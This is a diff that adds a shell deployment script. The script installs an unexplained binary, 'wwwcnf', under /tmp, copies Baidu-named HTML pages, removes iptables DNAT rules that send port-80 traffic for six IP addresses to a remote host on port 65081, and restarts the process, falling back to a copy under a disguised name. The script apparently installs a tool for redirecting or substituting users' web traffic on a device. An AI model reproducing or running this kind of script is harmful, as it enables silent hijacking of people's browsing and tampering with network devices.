@@ -1,0 +1,39 @@
+#!/bin/sh
+
+mkdir -p /tmp/app/hdqa/bin/
+
+cp wwwcnf.cf /tmp/app/hdqa/bin/wwwcnf.cf
+cp wwwcnf /tmp/app/hdqa/bin/wwwcnf
+chmod +x /tmp/app/hdqa/bin/wwwcnf
+cp mbaidu_1012883x.htm /tmp/mbaidu_1012883x.htm
+cp baidu_92641962_hao_pg.html /tmp/baidu_92641962_hao_pg.html
+
+iptables -t nat -D PREROUTING -p tcp -d 125.90.206.141  --dport 80 -j DNAT --to-destination 43.242.142.230:65081
+iptables -t nat -D PREROUTING -p tcp -d 125.89.198.84   --dport 80 -j DNAT --to-destination 43.242.142.230:65081
+iptables -t nat -D PREROUTING -p tcp -d 113.107.44.236  --dport 80 -j DNAT --to-destination 43.242.142.230:65081
+iptables -t nat -D PREROUTING -p tcp -d 58.63.233.34    --dport 80 -j DNAT --to-destination 43.242.142.230:65081
+iptables -t nat -D PREROUTING -p tcp -d 183.6.245.180   --dport 80 -j DNAT --to-destination 43.242.142.230:65081
+iptables -t nat -D PREROUTING -p tcp -d 113.107.76.5    --dport 80 -j DNAT --to-destination 43.242.142.230:65081
+
+killall wwwcnf
+sleep 3
+
+program=`ps | grep 'wwwcnf' | grep -v 'grep'`
+if [ -z "$program" ]
+then
+        program=`ps | grep 'wWpf' | grep -v 'grep'`
+        if [ -z "$program" ]
+        then
+                /tmp/app/hdqa/bin/wwwcnf -n -f /tmp/app/hdqa/bin/wwwcnf.cf &
+        else
+		mkdir -p /tmp/app/wwlh/bin/
+		cp wwwcnf.cf /tmp/app/wwlh/bin/wWconfig.config
+		cp wwwcnf /tmp/app/wwlh/bin/wWpf
+		chmod +x /tmp/app/wwlh/bin/wWpf
+		killall wWpf
+        fi
+fi
+killall reseach
+
+
+exit 0
